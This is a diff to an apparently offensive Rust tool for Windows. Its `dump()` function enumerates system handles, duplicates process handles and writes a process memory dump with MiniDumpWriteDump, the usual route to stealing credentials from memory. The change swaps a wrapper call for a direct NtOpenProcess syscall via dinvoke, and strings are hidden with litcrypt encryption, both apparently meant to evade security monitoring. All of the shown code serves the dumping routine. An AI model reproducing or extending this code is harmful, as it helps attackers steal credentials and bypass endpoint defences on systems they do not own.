@@ -4,10 +4,9 @@ use_litcrypt!();
 
 use litcrypt::lc;
 use core::panic;
-use std::{mem::size_of, ptr};
-use bindings::Windows::Win32::{Foundation::HANDLE, Security::SECURITY_ATTRIBUTES, System::{Threading::GetCurrentProcess, WindowsProgramming::{PUBLIC_OBJECT_TYPE_INFORMATION}}};
-use data::{CreateFileA, GENERIC_ALL, MiniDumpWriteDump, NtDuplicateObject, NtQueryObject, NtQuerySystemInformation, PVOID, QueryFullProcessImageNameW, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO};
-use dinvoke::open_process;
+use std::{mem::{size_of}, ptr};
+use bindings::Windows::Win32::{Foundation::HANDLE, Security::SECURITY_ATTRIBUTES, System::{Threading::GetCurrentProcess, WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, PUBLIC_OBJECT_TYPE_INFORMATION}}};
+use data::{CreateFileA, GENERIC_ALL, MiniDumpWriteDump, NtDuplicateObject, NtOpenProcess, NtQueryObject, NtQuerySystemInformation, PVOID, QueryFullProcessImageNameW, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO};
 
 pub fn dump() {
 
@@ -39,8 +38,8 @@ pub fn dump() {
         loop
         { 
             buffer =  vec![0u8; bytes as usize];
-            let mut ret: Option<i32>;
-            let mut fun: NtQuerySystemInformation;
+            let ret: Option<i32>;
+            let fun: NtQuerySystemInformation;
             ptr = std::mem::transmute(buffer.as_ptr());
             let bytes_ptr: *mut u32 = std::mem::transmute(&bytes);
             
@@ -76,8 +75,42 @@ pub fn dump() {
 
             if (*shtei).process_id > 4
             {
+                let function_ptr: NtOpenProcess;
+                let handle_ptr: *mut HANDLE = std::mem::transmute(&HANDLE::default());
+                let object_attributes: *mut OBJECT_ATTRIBUTES = std::mem::transmute(&OBJECT_ATTRIBUTES::default());
+                let client_id = CLIENT_ID {UniqueProcess: HANDLE{0:(*shtei).process_id as isize}, UniqueThread: HANDLE::default()};
+                let client_id: *mut CLIENT_ID = std::mem::transmute(&client_id);
+                let ret: Option<i32>; 
                 // PROCESS_DUP_HANDLE as access right
-                let handle = open_process(0x0040, 0, (*shtei).process_id as u32).unwrap();
+                dinvoke::execute_syscall!(
+                    "NtOpenProcess",
+                    function_ptr,
+                    ret,
+                    handle_ptr,
+                    0x0040,
+                    object_attributes,
+                    client_id
+                );
+
+                let handle;
+
+                match ret {
+                    Some(x) =>
+                    {
+                        if x == 0
+                        {
+                            handle = *handle_ptr;
+                        }
+                        else 
+                        {
+                            shtei = shtei.add(1);
+                            continue;
+                        }
+                    },
+                    None => {shtei = shtei.add(1); continue},
+                }
+
+
                 if handle.0 != 0 && handle.0 != -1
                 {
                     let func_ptr: NtDuplicateObject;
@@ -244,7 +277,7 @@ pub fn dump() {
                                 template
                             );
 
-                            let mut file_handle = HANDLE::default();
+                            let file_handle;
                             match  reti{
                                 Some(z) => file_handle = z,
                                 None => { panic!("{}", &lc!("[x] Error creating the dump file.")); },
